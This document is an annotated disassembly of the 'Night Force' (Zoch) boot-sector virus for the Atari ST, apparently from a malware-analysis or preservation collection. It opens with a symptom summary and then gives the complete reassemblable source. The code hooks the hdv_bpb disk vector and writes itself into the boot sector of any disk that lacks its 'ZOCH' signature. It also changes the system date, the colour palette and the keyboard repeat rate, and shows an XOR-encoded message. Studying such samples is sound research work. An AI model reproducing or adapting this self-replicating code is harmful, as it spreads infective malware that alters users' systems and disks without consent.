; Night Force Virus
; Known names: Zoch Virus 
; Symptoms: 
; - replicates iself
; - change color palette (to make the message looks better) and shows message "-THE NIGHT FORCE VIRUS BREAKER--BY ZOCH" at boot
; - set the current date to 1990-10-7
; - change the keyboard rate
; Replication: on any drive calling Getbpb(), when called, on any bootsector if the virus signature "ZOCH" is not found in OEM reserved bytes
; Resident address: at Disk Buffer (DISKBUFP) + 0x600
; Bootcode size: 394 bytes 
; Bootcode start: 0x1E
; Stealth location: N/A
; Attached vectors: hdv_bpb
; Reset resistance: No
; TOS compatible: All
;
; What's special? 
; - The encoded message (XOR) and the fact it re-encodes the messages in RAM after decoding and display
; - Using the OEM bytes to store a signature
; - Symptoms (except replication) are happening only at boot time and are ususual (changing the keyboard rate and change the date)

; ----------------------------------------------------------------------------------------------------------
; Registers
; ----------------------------------------------------------------------------------------------------------

HDV_BPB                         equ $472                ; $000472|long |Vector for getbpb for hard disk                      |hdv_bpb
DISKBUFP                        equ $4C6                ; $0004C6|long |Pointer to 1024-byte disk buffer                     |_dskbufp

; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------

; virus specific
BOOTSECTOR_BRA                  equ $601C5A4F           ; BRA ZO
BOOTSECTOR_OEM                  equ $43480000           ; CH
BOOTSECTOR_SIGNATURE            equ $5A4F4348           ; basically ZOCH = BOOTSECTOR_BRA[2].W | BOOTSECTOR_OEM[0].W 
CODEC                           equ $72                 ; XOR ey
NEW_DATE                        equ $1547               ; 1990-10-7
                                                        ; date is a bit array arranged as illustrated under Tgetdate(): 
                                                        ; Bits 15-9: Years since 1980, Bits 8-5: Month, Bits 4-0: Date
                                                        ; 0001010-1010-00111

; ----------------------------------------------------------------------------------------------------------
; Pointers
; ----------------------------------------------------------------------------------------------------------

BOOTSECTOR_START        equ START-$1E

    org $1E

;BRA.S     START
;DC.B      'ZOCH',$00,$00,$BA,'i'
;DC.B      $1F,$00,$02,$02,$01,$00,$02,$80
;DC.B      $00,'h',$06,$F9,$03,$00,$0A,$00
;DC.B      $02,$00,$00,$00

START:
        LEA       BOOTSECTOR_START(PC),A0
        MOVEA.L   DISKBUFP.L,A1
        ADDA.L    #$600,A1
        MOVEA.L   A1,A2                             ; A2 = A1 = diskbuf+1536
        MOVE.W    #$7F,D0                           ; for d0 = 127 to 0
.copy:
        MOVE.L    (A0)+,(A1)+                       ; copy 512 bytes from A0= (diskbuf) to A1=diskbuf+1536
        DBF       D0,.copy

        LEA       SYMPTOMS(PC),A0                   ; A0 = SYMPTOMS
        LEA       BOOTSECTOR_START(PC),A1           ; A1 = BOOTSECTOR_START
        SUBA.L    A1,A0                             ; A0 = A0 - BOOTSECTOR_START
        ADDA.L    A0,A2                             ; A2 = diskbuf + 1536 + (SYMPTOMS - BOOTSECTOR_START)
        JMP       (A2)                              ; jump there! Symtoms relocated in diskbuf+1536

; ---------------------------------------------------------------------------------------------------------- 
; SYMPTOMS (called onlyt at boot when the virus installs itself)
; ---------------------------------------------------------------------------------------------------------- 
SYMPTOMS:
        LEA       OLD_HDV_BPB_VECTOR(PC),A0         ; save old hdv_bpb vector
        MOVE.L    HDV_BPB.L,(A0)

        LEA       HDV_BPB_VECTOR(PC),A0
        MOVE.L    A0,HDV_BPB.L                      ; replace by new vector

        PEA       PALETTE_DATA(PC)                  ; palette = PALETTE
        MOVE.W    #6,-(sp)                          ; VOID Setpalette(word * palette)
        TRAP      #$E

        MOVE.W    #1,-(sp)                          ; rate = 1 - rate indicates the amount of time between repeats (in 50Hz ticks)
        MOVE.W    #$A,-(sp)                         ; delay = 10 - delay specifies the amount of time (in 50Hz ticks) before a key begins repeating
        MOVE.W    #$23,-(sp)                        ; WORD Kbrate( word delay, word rate ) : reads/modifies the keyboard repeat/delay rate.
        TRAP      #$E                               ; Xbios
        
        MOVE.W    #NEW_DATE,-(sp)                   ; date =  1990-10-7 - date is a bit array arranged as illustrated under Tgetdate(): Bits 15-9: YEars since 1980, Bits 8-5: Month, Bits 4-0: Date
                                                    ;         0001010-1010-00111
        MOVE.W    #$2B,-(sp)                        ; WORD Tsetdate( uword date ) : sets the current GEMDOS date.
        TRAP      #1                                ; Gemdos

        CLR.L     D0                                ; clear D0
        LEA       ENCODED_MESSAGE(PC),A0
        MOVE.L    A0,-(sp)                          ; str = A0
.loop_decode:
        MOVE.B    (A0),D0
        EORI.B    #CODEC,D0                         ; decode message using XOR and key CODEC ($72)
        MOVE.B    D0,(A0)+                          ; and replace character in (A0)
        TST.B     D0                                ; until d0 == 0
        BNE.S     .loop_decode

        MOVE.W    #9,-(sp)                          ; CCONWS( str )
        TRAP      #1
        ADDA.L    #$16,sp                           ; fix all stacks

        ; re-encode message in RAM... why not
        LEA       ENCODED_MESSAGE(PC),A0
.loop_encode:
        MOVE.B    (A0),D0
        EORI.B    #CODEC,D0
        MOVE.B    D0,(A0)+
        CMPI.B    #CODEC,D0
        BNE.S     .loop_encode

        RTS

; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; when Getpbp( dev ) is called
; Applications installing themselves here should exp
; be for the actual function call beginning at 4(sp)
; ----------------------------------------------------------------------------------------------------------    
HDV_BPB_VECTOR:
        LINK.W    A6,#$0                            ; copy SP on A6
        MOVE.W    $8(A6),-(sp)                      ; Save copy of dev on stack to be kept after old vector call

        MOVEA.L   OLD_HDV_BPB_VECTOR(PC),A0         ; get old vector in A0 
        JSR       (A0)                              ; call old vector
        ADDQ.L    #2,sp                             
        MOVEM.L   D0/A0/A1,-(sp)                    ; save D0,A0,A1 on stack

        MOVEA.L   DISKBUFP,A0                       ; A0 = diskbuf

        ; check signature, if there, do nothing
        CMPI.L    #BOOTSECTOR_SIGNATURE,$2(A0)      ; DC.W 'ZOCH'
        BEQ.W     DO_NOTHING

        ; write bootsector branch and OEM
        MOVE.L    #BOOTSECTOR_BRA,(A0)+          
        MOVE.L    #BOOTSECTOR_OEM,(A0)+              

        ADDA.L    #$16,A0                           ; advance to boot code in A0 ($16 + $8 = $1E)
        LEA       START(PC),A1                      ; advance to bootcode in A1
        MOVE.W    #$77,D0                           ; for d0 = 119 to 0
.copy:
        MOVE.L    (a1)+,(a0)+                       ; copy 480 bytes from DISKBUFP[bootcode at $1E]
        DBF       D0,.copy

        ; create executable bootsector
        MOVE.W    #1,-(sp)                          ; execflag = 1 (executable)
        MOVE.W    #$FFFF,-(sp)                      ; no change
        MOVE.L    #$FFFFFFFF,-(sp)                  ; serial
        MOVE.L    DISKBUFP.L,-(sp)                  ; buf = diskbuf
        MOVE.W    #$12,-(sp)                        ; PROTOBT
        TRAP      #$E                               ; Xbios

        MOVE.W    #1,-(sp)                          ; count: 1                   
        CLR.L     -(sp)                             ; side: 0 | track: 0
        MOVE.W    #1,-(sp)                          ; sector: 1  
        MOVE.W    8(A6),-(sp)                       ; dev of Getpbp( dev ) put on stack copy
        CLR.L     -(sp)                             ; rsrvd = 0
        MOVE.L    DISKBUFP.L,-(sp)                  ; buf = diskbuf
        MOVE.W    #9,-(sp)                          ; FLOPWR
        TRAP      #$E

        ADDA.L    #$22,sp                           ; fix both stacks
DO_NOTHING:
        MOVEM.L   (sp)+,A0-A1/D0
        UNLK      A6
        RTS

; ----------------------------------------------------------------------------------------------------------
; data
; ----------------------------------------------------------------------------------------------------------
OLD_HDV_BPB_VECTOR:
        DC.L      $00FC0DE6

PALETTE_DATA:
        DC.B      $00,$00,$01,$20,$02,$20,$03,$20   ; palette colors 0-3
        DC.B      $04,$20,$05,$20,$06,$20,$07,$20   ; palette colors 4-7
        DC.B      $00,$70,$01,$11,$02,$22,$03,$33   ; palette colors 8-11
        DC.B      $04,$44,$05,$55,$06,$66,$07,$77   ; palette colors 12-15

ENCODED_MESSAGE:
        ; -THE NIGHT FORCE VIRUS BREAKER--BY ZOCH
        DC.B      $69,$2B,$52,$57,$5F,$26,$3A,$37
        DC.B      $52,$3C,$3B,$35,$3A,$26,$52,$34
        DC.B      $3D,$20,$31,$37,$52,$24,$3B,$20
        DC.B      $27,$21,$52,$30,$20,$37,$33,$39
        DC.B      $37,$20,$5F,$69,$2B,$50,$42,$69
        DC.B      $10,$45,$5F,$30,$2B,$52,$28,$3D
        DC.B      $31,$3A,$5F,$69,$3A,$69,$3E,$69
        DC.B      $3E,$69,$3E,$69,$3E,$69,$3E,$69
        DC.B      $3E,$69,$3E,$69,$3E,$75,$72,$00
    END
